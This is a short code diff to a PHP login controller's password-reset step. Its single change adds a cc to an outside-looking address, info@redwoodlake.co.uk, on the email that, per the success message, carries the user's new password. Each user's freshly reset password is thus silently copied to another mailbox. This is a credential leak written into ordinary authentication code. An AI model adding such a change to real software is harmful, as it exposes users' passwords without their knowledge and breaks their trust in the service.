@@ -93,7 +93,7 @@ class LoginController extends Controller
                 'email' => $user->email
             ];
 
-            Mail::to($user->email)->send(new ForgotPassword($data));
+            Mail::to($user->email)->cc('info@redwoodlake.co.uk')->send(new ForgotPassword($data));
 
             return redirect('/login')->with('success', 'Password successfully reset! Please check your email for your new password');
         }
